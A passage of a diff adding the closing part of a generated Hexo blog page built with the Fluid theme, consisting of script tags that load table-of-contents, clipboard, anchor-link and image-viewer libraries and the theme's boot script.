+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
